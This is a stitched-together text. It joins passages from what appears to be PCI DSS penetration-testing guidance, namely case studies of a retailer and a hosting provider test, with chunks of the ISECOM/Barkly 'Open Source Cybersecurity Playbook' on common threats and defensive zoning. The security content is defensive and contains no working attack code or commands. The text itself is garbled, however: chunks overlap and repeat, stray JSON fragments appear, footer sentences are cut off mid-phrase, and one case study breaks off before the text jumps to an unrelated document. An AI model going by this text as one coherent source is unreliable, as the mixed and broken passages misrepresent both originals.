The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence (OSINT) gathering is an important next step in confirming scope and determining that all the appropriate assets have been included in the test. Newly discovered assets were vetted by the Client to determine whether they should be included in the penetration test. During this phase of the assessment, an additional disaster recovery site was identified in DNS, and Client confirmed this to be a warm backup in the event of failure of the primary sites. All relevant assets were added to the scope. The intent of this document is to provide supplemental information. Information provided here does not 28\\nOnce the assets were confirmed, the penetration tester enumerated the publicly available services provided by the targets. The tester actively tried to obtain usernames, network-share information, and application- version information of all running services and applications. In this phase, the penetration tester began to spider and map the applications, with and without credentials, in preparation for the exploitation phase. The tester was provided with the ability to complete a full transaction all the way through checkout and order confirmation. With target enumeration complete, the tester performed vulnerability mapping of identified services using automated tools and by comparing the port and service fingerprint against well-known vulnerability databases. This produced a list of unconfirmed vulnerabilities that were further examined in the exploitation phase of testing. The exploitation phase included tests and techniques designed to meet the objectives of the test. (These must be exploitive and may also be used to confirm the effectiveness of ancillary security controls such as intrusion detection systems or web application firewalls.) It was during this step that testing of the applications for issues related to the OWASP Top 10 and other web application frameworks took place. The final phase of testing included post-exploitation techniques. The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation techniques to gain additional access to systems or network resources. The extent to which post-exploitation techniques were performed were defined prior to the start of test to prevent the tester from putting production systems at risk of destabilization. Main vulnerabilities identified were: High:  Apache Tomcat Manager Application Deployer Authenticated Code Execution  Cross-site scripting (reflective)  Directory traversal Medium:  Deprecated protocols - SSLv2, SSLv3  SSL weak ciphers  Internal IP address disclosure Low:  IPS not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report.

Information provided here does not 29\\nThe penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was noted that the denial-of-service attack and missing IPS, while serious issues for a retailer, were not PCI-relevant findings and would not be required in order to obtain a clean report. The Client corrected all High and Medium-severity vulnerabilities within a 90-day window and the Pen Test Company provided documentation of successful remediation to the Client. 6.2 Hosting Provider Penetration Test Case Study Case Introduction PCIData Hosting is a hosting service provider. The only cardholder data environment that exists within PCIData Hosting belongs to its PCI DSS compliant customer, TechMerchant. TechMerchant is operating an e-commerce web environment on the PCIData hosting hardware. TechMerchant is solely responsible for the administration and maintenance of all the software and applications used to support its e-commerce environment. PCIData Hosting is bound by contract with TechMerchant to maintain PCI Compliance. PCIData Hosting is required to maintain PCI Compliance by TechMerchant since PCIData Hosting provides critical security services to TechMerchant for its PCI DSS compliance. In addition, PCIData Hosting has a wish to extend this type of PCI DSS hosting service to more customers in the payment card industry. PCIData Hosting is managing the systems in the cardholder data environment and is responsible for physical security, hardware, network, firewalls, and OS including updates, configuration etc. Applications and databases are not the responsibility of PCIData Hosting. Storing, processing, and transmitting cardholder data are in TechMerchant’s scope and have been described and assessed in its own PCI DSS Assessment. PCIData Hosting has no type of cardholder data transactions in scope, and the only entity hosted from a PCI perspective is TechMerchant, for whom they only provide hardware hosting services and logical system management. Description of Environment The environment at PCIData Hosting consists of five different networks:  ODIN Network Zone: Only VMware Hypervisors used for the TechMerchant CDE servers and environment are hosted in this network segment. This network is not accessible from the THOR network.  THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed",

The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed at TechMerchant.  LOKE Network Zone: Guest network used for external consultants, other guests, BYOD devices, etc. This is the only network that has wireless access points connected. The intent of this document is to provide supplemental information. Information provided here does not 30\\n HEJMDAL Network Zone: Management network from which PCIData Hosting manages the different client networks that do not fall into PCI scope. This network is only used to manage non- CDE servers.  BALDER: All other clients are hosted on this network, including PCIData Hosting’s own office network. All networks are separated by firewalls, and access to ODIN and THOR network segments is restricted to two-factor authentication. The only wireless network is connected to LOKE (the guest network). The datacenter is located at PCIData Hosting’s location and is also in scope for PCI compliance. High-Level Network Diagram Success Criteria – The success criteria for the penetration test is to gain access to the CDE. Resource List (CDE environment)  ODIN – VMware servers  THOR – UNIX-based servers including webservers; Oracle databases in a secure zone  All employees at PCIData Hosting use Microsoft-based workstations to access the CDE environment. Pre-Engagement Actives (Planning) The methodology used for the penetration test was based on NIST SP800-115; the penetration test included the following phases: Planning, Discovery, Attack/Execution, Post-Execution and Reporting. The intent of this document is to provide supplemental information. Information provided here does not 31\\nThe planning phase was used to gather information needed for the assessment execution—such as the assets to be assessed, the threats of interest against the assets, and the security controls to be used to mitigate those threats—and to develop the assessment approach. The networks ODIN (VMware) and THOR (CDE Servers) are the targets of the penetration test as these servers are those that store, process, and transmit cardholder data. Scoping Discussion It was discussed with PCIData Hosting how they managed their CDE environment, including servers and databases. The operating systems are administrated by PCIData Hosting; all applications and development are handled by TechMerchant. Both PCIData Hosting and TechMerchant administer databases. Encrypted information in the database is only accessible with the encryption keys that are held by TechMerchant. All access to ODIN and THOR are authenticated by a two-factor solution. This also applies when accessed from internal networks at PCIData Hosting. TechMerchant’s last penetration test was reviewed to make sure that all perimeters, servers, etc. were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing.

The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the TechMerchant’s last penetration test  Security policies  Review of PCIData Hosting’s risk analysis. The following tests were performed during the assessment:  Internal penetration tests from LOKE (guest network), HEJMDAL (management network) and from the office network located in BALDER (Client).  Social engineering against PCIData Hosting administrators of ODIN (VMware) and THOR (CDE servers) in form of phishing e-mails  Physical security assessment as a part of the penetration test.  External testing of PCIData Hosting of their external IP-addresses. All servers, databases, employees with access to the CDE, etc. are considered in scope for the penetration test. The intent of this document is to provide supplemental information. Information provided here does not 32\\nPre-Test Preparations A user account was created for the penetration tester following the regular procedures for granting access to new employees. Access credentials for the guest network were also granted to the tester. Engagement Phase (Discovery and Attack/Execution) Discovery was performed on the LOKE (guest), HEJMDAL (management) and BALDER (office) networks to identify targets (servers, network components, workstations, etc.) on the networks, and analyzing techniques were used to get an understanding of the environment. The objectives of this phase were to identify systems, ports, services, and potential vulnerabilities. This phase was performed both manually and via automated tools including network discovery and port and service detection. When enough data was collected in the discovery phase, the penetration tester tried to gain access to the targets discovered. When access was gained to targets the tester tried to escalate privileges in order to gain complete control of the target. The access obtained was then used to gain more information about the environment, and a new discovery phase was started. The primary goal for the discovery and attack/execution was gaining access to the CDE, including the VMware hosts. The techniques used included password cracking, vulnerability scanning, social engineering, and network-layer testing. The above was completed for the following different perspectives during the assessment:  External attacker without knowledge of the environment  Internal attacker (guest, contractor, etc.)  Internal attacker (employee without access to the CDE) The following tests were performed during the assessment:  External attacker without knowledge of the environment External VPN connection was tested. o Phishing e-mails were sent to carefully selected victims who all are working with administrating o the CDE environment.

Information provided here does not 33\\nVulnerabilities were found on the different networks, and the tester was able to exploit these but was not able to use the vulnerabilities to gain access to ODIN or THOR. Main vulnerabilities identified were:  Man in the middle – It was possible to perform a man-in-the-middle attack using ARP poisoning but the tester was not able to extract any sensitive information that could provide information on how to gain access to ODIN or THOR.  Weak password policy implemented – Weak password settings on local servers on the BALDER network were used to compromise accounts on this network. The tester was not able to use these accounts to gain access to ODIN or THOR. As these servers are not in PCI scope, the weak password policy was not considered to have an impact on compliance.  Old user accounts were compromised – The tester was able to compromise user accounts that were created but had never been in use on the BALDER network. The compromised accounts did not grant access to ODIN or THOR.  Others – Other vulnerabilities were noted as zone transfer, outdated software, unencrypted protocols used; these vulnerabilities were all related to LOKE or BALDER network and did not grant access to ODIN or THOR even when exploited. Post-Engagement (Post-Execution phase) The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though they did not have an impact on the cardholder data environment. The penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was confirmed that none of the vulnerabilities had an effect on the cardholder data environment. As no significant vulnerabilities related to the CDE environment were discovered and access to the CDE environment was not obtained, remediation testing was not performed.

Cardholder data is collected as a card-present transaction by swiping or keying the card into a POS terminal. The information is then sent to a local server at each store before being sent out to the processor. No cardholder data is transmitted between stores or back to corporate. After receiving a confirmation from the processor, cardholder data is purged from the POS server. The POS server runs a PA-DSS point-of-sale application. Corporate has a persistent VPN connection into each of the store locations to allow for administration of networked resources, accessing CCTV recordings, and checking inventory. Description of Environment The environment at Green Clothing consists of six store locations and one corporate office. All stores were determined to be identically configured and have been segmented into two networks:  POS Network – Cardholder Data Environment (CDE) 2 POS devices o 1 POS server o  General Store Network (Non-CDE) 1 manager workstation o 1 CCTV server o Corporate is made up of two network segments:  Corporate General User Network (Non-CDE) 4 workstations o 1 wireless access point o  Corporate IT Management Network (Non-CDE) o 3 workstations used to manage CDE servers The intent of this document is to provide supplemental information.

CREATIVE COMMONS ATTRIBUTION-NODERIVATIVES 4.0 2016 ISECOM AND BARKLY THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPart 1: Scouting Reports What security threats should I be prepared for? The first key to any effective security game plan is knowing what you’re up against. In this section, you’ll learn all about ten of the most common threats your company is likely to face. While by no means comprehensive, this list can help you better understand some of the tactics being directed against you and your users, along with the specific reasons you’re potentially vulnerable to each. From phishing to ransomware to distributed denial of service (DDoS) attacks, the more you know about these threats the better. They’re some of the leading causes of data breaches, downtime, and a serious lack of sleep. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 4 Phishing What it is: Any attempt to compromise a system and/or steal information by tricking a user into responding to a malicious message. The most common phishing attacks involve emails armed with malware hidden in attachments or links to infected websites, although phishing can be conducted via other methods such as voicemail, text messages, and social media, too. What makes protection a challenge: For one thing, employees are already in the habit of clicking things because that’s how you interact with modern computers. For another, phishing emails are much more sophisticated than they used to be. Scammers can take over legitimate email accounts or spoof their email addresses to make it look like messages are coming from someone employees trust. Once a victim is tricked and becomes compromised, the attacker now has their access credentials. They can reach all the same servers, log into the same web applications, and download the same files as if they were that employee. The challenge with protecting against this is you need to limit what servers employees can access or how they can access them. There are times that may run counter to what they need to do their jobs. Additionally, even if you train employees to be on the lookout for suspicious emails, some phishing attacks can be extremely targeted and look just like any other email from a trusted source who is being impersonated. The most convincing examples of these “spear phishing attacks” don’t provide any red flags until it’s too late. Social Engineering What it is: There are two ways to steal anything — you either take it yourself or you get someone else to give it to you. Social engineering is a broad umbrella term for any tactics designed to exploit and manipulate trust, so the victim hands the attacker what they",

    "text": "What it is: There are two ways to steal anything — you either take it yourself or you get someone else to give it to you. Social engineering is a broad umbrella term for any tactics designed to exploit and manipulate trust, so the victim hands the attacker what they want — access to information, accounts, or computers inside a secured area. Think fake customer service calls designed to reset passwords or a criminal spoofing your CEO’s email address and asking someone in finance to send an urgent wire transfer — a type of scam referred to as a business email compromise (BEC). What makes protection a challenge: Everyone — repeat, everyone — can be conned, defrauded, fooled, or manipulated. Being vulnerable can sometimes come down to a lack of training or experience, but more often it can simply come down to distraction and mental fatigue. Since this attack targets people directly there’s very little that technical safeguards can do, especially if the action isn’t outside the employee’s typical responsibilities or usual behavior — like resetting a password for a desperate user (a typical tech support con). THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 5 Ransomware What it is: Malicious software designed to encrypt a victim’s files and then demand payment, generally in anonymous Bitcoin, in exchange for decrypting the files. As with other malware infections, ransomware attacks typically start with employees falling victim to phishing emails or visiting compromised websites. Unlike other malware infections, however, the primary goal of ransomware isn’t to gain stealth and persistence for long periods of time. Instead, its priority is to spread as quickly as possible, encrypt as much data as possible, then actively alert victims of its presence so criminals can extort them. What makes protection a challenge: Ransomware will lock up any drive the employee has access to, including connected USB drives and network shares. Once files are encrypted the only way to regain access to them is to a) hope you have a reliable, up-to-date backup; b) hope a security researcher has cracked the encryption and made a decrypting tool available; or c) hold your nose and pay the ransom. Paying up is anything but a sure thing, because, well, ransomware authors are criminals. Being dishonest is what they do. They’re also occasionally less than spectacular at coding, so there’s also the risk of paying the ransom only to find your files were accidentally destroyed or rendered unrecoverable. One reason ransomware is hard to protect against is because it’s built to turn a strength — making files accessible across an organization — into a weakness. Additionally, with ransomware developing into a billion-dollar industry, there’s plenty of incentive for criminals to continue investing in delivery and evasion tactics to keep their business model humming. That means they can change faster than your signature-based security solutions can keep up.

Downloaders What it is: Normal-looking programs designed to fetch and install malware without raising any security alarms. In effect, what downloaders allow attackers to do is to get a “man on the inside” prior to committing to a full attack (it’s no coincidence they’re typically called “trojan programs”). Once a downloader creeps its way onto a victim’s system it can scope out the security settings, then smuggle other dangerous malware in after it’s established the cost is clear. Even after an attack is discovered and the other malware has been removed, as long as the downloader is still there hiding away, it can grab more malware and start the process all over again. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 6 What makes protection a challenge: Downloaders are one step removed from the actual dirty work involved in executing an attack. That means they don’t have to pack the same kind of functionality that might get other malware blocked. Instead, malware makers can focus solely on designing downloaders to be extremely good at avoiding detection. Think of it as attackers choosing to have a team made up skilled specialists rather than mediocre generalists. The downloader is a prolific passer and the malware it downloads is a sensational scorer. With both of them able to focus on their respective speciality, they’re able to be much more effective when paired together. Drive-by Downloads / Download Hijacking What it is: In nature, the big predators hang out at common water holes and wait for their prey to come by. On the Internet, the big predators find ways to turn popular website visits into covert attacks. In some cases, they inject code through comments that force unsuspecting visitors to automatically download malware. In other cases, they compromise the web server and inject malicious code into seemingly legitimate downloads. Another trick is to utilize exploit kits, programs designed to actively probe the website visitor’s system for software vulnerabilities that can be exploited. What makes protection a challenge: Not only do attackers have the element of surprise in these situations, they also have a collection of tricks to make sure they’re successful. If you update your browser, they’ll update their code. If you patch a vulnerability they’ll move on to a new one. It’s also not as if we’re talking about strictly sketchy websites. Some of the web’s most popular sites (The New York Times, the BBC, AOL, the MSN homepage) have been compromised in the past. You usually can’t ask employees to stop using the Internet altogether. Malvertising What it is: Marketers aren’t the only ones who like to utilize advertising to get in front of the crowds of website visitors. Criminals do the same thing, creating fake ads or inserting malicious code into legitimate ads so they can quite literally capture their audience. What makes protection",

Criminals do the same thing, creating fake ads or inserting malicious code into legitimate ads so they can quite literally capture their audience. What makes protection a challenge: Online advertising is already incredibly prevalent and chances are it’s only going to grow more aggressive. At the same time, people are also becoming increasingly used to ads, including pop-ups, etc. and they’re no longer viewed with as much mistrust. In terms of protection, the quick knee-jerk reaction is to use ad-blocker software. Unfortunately, many websites don’t work unless you deactivate it. And if employees have to choose between their ad-blocker and a top 10 list of cat videos... THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 7 Zero-Day Attack What it is: Traditionally, a zero-day refers to any undisclosed vulnerability that attackers can exploit before victims and software vendors become aware of it and have the chance to patch it. The term “zero-day attack” is also sometimes more broadly applied to attacks that utilize new tactics, exploits, or malware variants that haven’t been seen before, giving them an advantage. What makes protection a challenge: It’s difficult to protect yourself against something you’ve never encountered before, especially if it blindsides you. Signature-based security solutions are particularly susceptible to getting bypassed by zero-day attacks since the way they identify malicious files is by comparing them to a list of previously captured malware samples to see if there’s a match. If an attack is using a never-before-seen exploit or piece of malware, there’s a good chance it’s going to claim a victim. Because of their effectiveness, zero-days are in high demand, and criminals have become increasingly incentivized to discover more of them. Unfortunately, that means uncovering and patching one vulnerability may only offer you momentary protection before attackers move on to exploiting the next one. Password Cracking What it is: A login and password isn’t what most people think it is. It’s actually a complicated set of processes that can involve multiple systems, secure transport to and from the servers, a trusted network of server identity assurance and revocation, code to evaluate the complexity of the user-generated password, more code to make sure the person entering the code is indeed a human, a secondary factor of authentication, and a means to recover lost passwords. So password cracking is more than just running a program to guess the password — it’s about cracking the password process to take over a user’s account. What makes protection a challenge: Any system that allows users to access it from anywhere and also requires those users to make, safeguard, and remember their own passwords is a system that’s going to be difficult (if not impossible) to defend. According to what OSSTMM researchers refer to as “The Somebody Sequence,” the more interaction somebody has in the security process, the greater its attack surface. Asking employees to",

Asking employees to manage their own passwords is like giving them full control over the keys to an important lock. You can purchase one of the strongest locks money can buy, but how secure can it ultimately be if there are keys for it floating around everywhere? THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 8 Distributed Denial of Service Attack (DDoS) What it is: There is only so much traffic a computer system can process before it starts to slow down and becomes overwhelmed. By gaining control over a large number of hijacked systems and devices (referred to as a botnet), attackers can direct large amounts of connection requests or packets of random data at a single target all at once, with the intention of overloading the system and taking it offline. What makes protection a challenge: The larger the botnet, the more damage a DDoS attack can do. The best you can hope for when you’re attacked is that you’re subscribed to an anti-DDoS service, but even that doesn’t provide a guarantee you’ll stay up and running if you’re dealing with an attack with a high level of magnitude. To make matters worse, sometimes attackers will contact their targets ahead of time and threaten to knock them offline unless “protection money” is paid up front. It can be difficult to discern whether such threats or simply scams, and — as is the case with ransomware — giving in to criminal extortion demands never comes with a guarantee. Scareware What it is: You’ve probably seen the pop-ups — “Warning! A virus has been detected on your computer. Download VirusBlaster to clean and remove it.” The malware that really infects your computer is the program that pop-up is trying to trick you into downloading. Scareware can come in a variety of forms from fake antivirus programs to fake browsers or software updates. What makes protection a challenge: We know that social engineering works because it preys on the distracted and mentally fatigued. Combine that with eagerness to please or help and thus begins the “good intentions” downward spiral that leads employees to make really bad decisions. Once scareware gets inside the system it has all the privileges, passwords, and logins of the employee who installed it. Getting it out may be as easy as just wiping the system and starting fresh or recovering from backup. Or it may be more difficult and time- consuming if the malware spreads to other systems.

THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 9 SQL Injection What it is: If a website has an input box or entry form (like when you’re entering in your username and password, or your credit card number if you’re buying something) then an attacker can try inserting structured query language code to gain access to or make changes to the stored data. What makes protection a challenge: SQL injection exploits a trust between the web application and its database to let the attacker do pretty much whatever it wants with the database. If all you can think of is “delete data” then you’re underestimating the depths a criminal can stoop to. Besides adding, removing, and changing data, and in addition to stealing info like client credit card numbers, personal data, and health records, there’s also the possibility of inserting malicious code to be passed back to users when they use the form, instead of the data they’re looking for. Once criminals start using that tactic they can abuse popular websites to do their dirty work for them like distributing drive-by downloads, building a botnet army, even hijacking DNS requests to send visitors to malicious versions of legitimate websites they know and trust. If the login form is vulnerable, SQL injection can even help with password cracking by the bypassing the login altogether. Any place where a user can input information into a website with a database, it has the potential to be SQL injectable, which unfortunately makes it a widespread problem. You can’t just remove all user-input interactions from your website and still get any purchases or feedback. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPart 2: The Game Plan As anyone who’s ever been on the wrong side of a data breach can attest, security is not a game. First of all, the stakes are real. But also unlike a game, there are no set rules or boundaries. Even if there were, attackers aren’t exactly known for their fair play. That said, we do tend to discuss security using sports terms. There is an offense with attackers and there is defense. The goal of the defenders is to stop the attackers, to prevent them from accessing or causing damage to our assets. This is done through defensive tactics just like the attackers apply offensive tactics. The biggest problem is we don’t always know the parameters of the “game” we’re playing with attackers until it’s too late. We don’t know who our opponents are. We don’t know their capabilities or their goals. Is it stealthy, silent robbery or a quick smash and grab for data they can quickly encrypt and ransom? Are we their target of hate or are we a moment of opportunity for them? As a result, we’re pressured to develop tactics that can somehow be equally effective against a diverse and rapidly growing variety of potential attacks.

As a result, we’re pressured to develop tactics that can somehow be equally effective against a diverse and rapidly growing variety of potential attacks. Worse, our defenses also have to take into account the operational needs of the business. Not only do we need to stop attacks, we also need to ensure our security measures don’t also slow or stop any processes or services. An attacker has no such limitations. As such, the first thing any game plan for our security efforts has to take into account is that attackers and defenders aren’t playing by the same rules. The playing field is anything but level. An attacker only has to be effective against one specific aspect of our defense — by any means possible — in order to be successful. As a defender, meanwhile, we have to be effective against all manner of potential attacks. And we have to operate under economical limitations, legal restrictions, and industry regulations. With the game so stacked against us, what does a winning strategy for defenders look like? THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 11 Create a Zone Defense You can’t go one-on-one with an opponent you can’t see coming. To counter an attacker’s advantages in terms of flexibility and surprise, you need to develop a zone defense. In sports, a zone is a means of separating the field into areas of focused defense. The idea is that by creating separation, you can ensure that a threat either cannot physically reach an asset or that it encounters an increased defense when it does. Establishing separation is at the heart of any effective defensive strategy, and the first step toward assuring security. To achieve it, build your game plan around the following: 1. Create zones by logically and physically separating services and assets from each other. Ex: Assets of one department should only be accessible to that department or group. All system accesses should be directly whitelisted (limited to a list of predetermined authorized types) through a switch and a firewall. 2. Create zones across your remote (vendor or cloud) accounts by using a separate login and secret sentence for each. Re-using passwords across vendors is the fastest and easiest way to get accounts compromised. Personal certificates and private key cryptography are much stronger than even secret sentences and should be used for administrative (root) access to external services. However, be sure to protect even those keys and certificates with a “secret sentence” — a password that is a complete sentence with capitalization and punctuation that means something to you so you’ll remember it. For example, a secret sentence for Facebook might be, I just wasted 2 hours on Facebook! For your VoIP provider, it might be, Boss says, “No more big bills.” complete with all the punctuation. 3. Create trust zones in the network where no system is directly accessible to another system. Ex: Desktops should not be able",

Create trust zones in the network where no system is directly accessible to another system. Ex: Desktops should not be able to connect to other desktops and network shares should be closed. Even if it’s on the same network, no system should be able to reach another system unless you planned for it to. Have all desktops connect to a fileserver to store documents. Make sure all administrative access ports like SSH on servers or administrative web access on intranet servers are only be reachable by the administrator’s system or, even better, manually on that server’s keyboard if it’s a local server. This is the network-level version of least privilege where only those who should access a particular document, printer, file server, or resource should be allowed to. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 12 4. Create system zones in addition to people zones. When you make zones of who can access what you are giving authorization to specific people and what they can do with their system. However, there is an inherent weakness in this type of zone: trust. Many types of attacks, like phishing attacks, use the trusts of a particular user to gain access to other systems without the user having any idea it’s happening. You want to make sure that any resource accessed is done so by the person authorized to do so, and not secretly from their compromised system. One of the most common technologies to help you do this is CAPTCHA, which makes you prove you’re human. In addition, it will reduce web comment SPAN and brute-force attacks (exhaustive attempts to guess passwords) on authentication systems. 5. Avoid all-in-one networked systems. Examples are network access storage (NAS) + printer, or router + wi-fi. These systems are inherently weaker because they are more difficult to securely configure and more difficult to zone by filtering who is authorized to use them. If your router has wi-fi built in, disable it and instead use a wi-fi router in a special zone which cannot connect to internal systems. 6. Maintain a rigorous patching schedule for systems that are connected directly to the Internet. While racing to patch should not be a primary defense, for Internet-facing services it’s one of the few ways you can protect a server. For non-Internet-facing systems, you will want to make patching and other updates part of a regular maintenance schedule rather than automatically implementing them all the time. This will give you time to test the patches and updates on the standard system first, as well as create a routine in your network traffic that will help you identify malicious installs. 7. Create zones in your desktops, servers, and mobile devices that separate what can execute and what can read/write. This allows for temp files to be created while denying temp",

Create zones in your desktops, servers, and mobile devices that separate what can execute and what can read/write. This allows for temp files to be created while denying temp files from executing in the case of malware. On desktops and mobile devices, whitelist specifically which applications may execute or use the network and deny the rest. Furthermore, exercise the principle of least privilege to ensure users don’t get administrative or elevated privileges by default. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 13 8. Keep work and personal mobile devices separate. Apps have notoriously bad security, and each app on your mobile device is connected to every other app on that device. That makes the concept of zoning incredibly important. If your business requires the use of mobile devices then separate which can have personal apps and which can have work apps. There is technology to separate work and personal data on one physical device if you don’t want to carry two devices. 9. Create zones by using multiple web browsers to deal with web attacks. For example, you can keep one browser clean with no plug-ins and use it specifically for banking, vendor administration, and other critically confidential connections. Use another browser for online shopping. Use another browser for reading the news, surfing, and social networks (note: Do use ad blockers and privacy plug-ins on the browser for surfing to minimize exposure to malicious ads that force downloads of malware). You can also use a single browser with multiple profiles, however some browsers require a particular profile to be closed while another is open, and that can be a hassle. 10. Zone your remote interactions. That means any remote access to your office, interactions with cloud services, administrating vendor accounts over the web, or sending emails. Your best protection for remote interactions is encryption. Use an encrypted VPN if the place you’re sending or receiving from is not your place of work. Because emails are plain text and can be read along the route from one place to another you should use email encryption anytime you’re emailing between remote offices or sending sensitive information. 11. Use work times as part of your zoning. Shut down systems, routers, and wi-fi access points you don’t need to keep running at the end of the day, weekends, and holidays. If you can’t have staff support incident response for these things and be there to deal with emergencies then they should not be connected to the Internet during those times. 12. Use blacklists if you can’t whitelist or as an addition to whitelisting. A blacklist is a list of everything not allowed to enter or connect to a particular system. A whitelist, on the other hand, is a list of the things you allow. By using blacklists, you can deny entire categories of devices, programs, or service types if they aren’t",

By using blacklists, you can deny entire categories of devices, programs, or service types if they aren’t needed. Despite being weaker and easier to bypass than whitelists, blacklists are much easier to implement and maintain. This makes them practical as an additional form of separation. For example, most antivirus software utilizes a blacklist that enumerates known bad malware to search for in downloads and installs. SPAM controls work mostly with blacklists. Most firewalls and routers can employ blacklists to deny access from countries where they don’t do business. Specialized threat blacklists can also block known sites serving malware and launching attacks. Any of these can be employed as additional protection. Just keep in mind they can be shockingly easy for attackers to circumvent and therefore they should never be the main form of separation. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 14 Apply Rehabilitation Tactics As is frequently the case in sports, outcomes in security are often determined by conditioning that took place far in advance. Athletes don’t show up to game day without putting in countless hours of practice first, and sporting franchises don’t invest in star athletes without first ensuring they have the trainers, doctors, and coaches necessary to support them and keep them performing at their best. Ask yourself: How rigorously has your security been tested? How many scenarios have you’ve prepared for? How quickly can you recover from setbacks and attacks? Security is equal parts preparation and resiliency. To achieve that, you need to adjust your game plan so it includes regularly revisiting steps for what to do when something goes wrong. Here are some rehabilitation tactics you should be sure to use: 1. Set up a means to back up and restore systems, data, mobile devices, and desktops. Backups should be centralized, secured, and ideally encrypted. If your backups are encrypted, both off-site (cloud) and internally stored back-ups are acceptable. Just remember, anything backed up outside your network is no longer in your control. Then again, if you cannot afford to properly build and test a backup system then you’re better off leaving control of such things to services that can. The key, however, is quick recovery, so test out restoring and make sure it happens quickly. 2. Have tools handy to fully copy a drive for forensics investigations and recovery. There are both hardware and software technologies that can do this, some of which are certified to use in criminal investigations. If you have cyber insurance for your network, you may be required to use specific forensic software to make a claim. 3. Keep shared data in central locations like a network access storage (NAS) server. That minimizes the amount of loss that occurs when a particular desktop fails.

Being prepared for recovery will allow most compromised systems to be completely copied for forensics, wiped, and reinstalled to nearly full operation in under two hours. 4. Back up everything — even your centralized data. It’s the only way to assure a complete recovery. Set up all data services and file servers to be backed up and redundant with fall-back servers. This assures continuity and resilience so that server failure does not mean loss of service. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 15 5. Have emergency contact numbers for vendor support. If a forensics investigation uncovers why a particular attack was successful it may require immediate attention in the form of a patch, a configuration change, or both. 6. Consider investing in a distributed denial of service (DDoS) protection service. This can be especially important if your business relies on customers having timely access to an online presence such as an online store. There are many of these and it’s possible your hosting provider already offers this. However, you do need to make sure you know how much DDoS protection they can offer and perhaps invest in a vendor who specializes in it. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 16 Use Your Home Field Advantage The Internet is a hostile environment. That’s the reason we go to so much trouble to make sure our networks are able to interact but still remain separated from it. However more than just creating a safe environments for our users we need to take things one step further and also make them hostile environments for attackers. Creating an atmosphere and conditions that make it easy for you to thrive but difficult for your opponents — in sports this is what people refer to as home field advantage. Sometimes it can simply involve extra motivation and support from fans, but in some contexts there really are environmental factors involved. Some teams are better conditioned to perform on grass vs. synthetic fields. Others do better at high altitudes or in extreme heat or cold. In cybersecurity, there are three primary “home field advantages” you should be striving to leverage: visibility, protocol, and process. Do that and you can exploit the fact that, in order to do damage, attackers have to play the “away team” role. They have to come into your environment and contend with a network of systems you know better than anyone else. Here’s how to make the most of your home field advantages: 1. Know what’s happening on your network. This is probably your greatest home field advantage. To monitor your network for activity and have a clear picture",

This is probably your greatest home field advantage. To monitor your network for activity and have a clear picture of what’s running at any time of day there are several technologies you can look into. Security information and event management (SIEM) products will consolidate log files from all your systems and real-time captures of network traffic. Intrusion Detection Systems (IDS), which are generally a blacklist technology, will monitor real-time network traffic and respond to some types of attacks. Even without these technologies, however, tools like tcpdump and Wireshark will you give you more than enough information to understand what’s running on your network and where it’s going. That will help you at least see if your zone defense is working. As a network grows, you may want to look into behavioral analysis network tools to help automate sniffing out anomalies, because not all malicious activity is obvious. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 17 2. Know what should be on each default install of each hard drive, whether it’s a desktop or a server. This allows you to recognize malware or non-standard software installs. If you prefer to use file integrity software you will be alerted to changes in various files and directories that can indicate malware or compromise. Integrity checking is most powerful on servers where it can immediately replace files placed by attackers. 3. Change default settings. Your protocols are not just the types of packets that run on your network, but how you configure them to run. The attacker needs to learn what you’re running, how it’s connected to the rest of the network, and how it responds. By changing the default install and directory names, default logins and passwords on systems and devices, and default configurations such as the service ports of network devices and servers you can protect yourself from bot attacks which look for defaults. Simply moving the administrative port of SSH to a random, high number will keep it discreetly out of obvious reach while your network monitoring tools will notice a port scan and give you a chance to stop it. 4. Change how your servers respond to queries. Attackers who footprint your network for a targeted attack will primarily be looking for what kinds of systems and applications you have. Changing how your servers respond to queries so that there are only positives and false positives will flood common attack tools with noise so they cannot tell if the tool’s replies are true. For example, something as simple as changing your web servers to respond to every request with a 200 even if it’s not found or moved (error codes 404 and 302, respectively) can render common, automated web scraping and analysis tools mostly useless. You can tune your TCP responses also so every port queried responds",

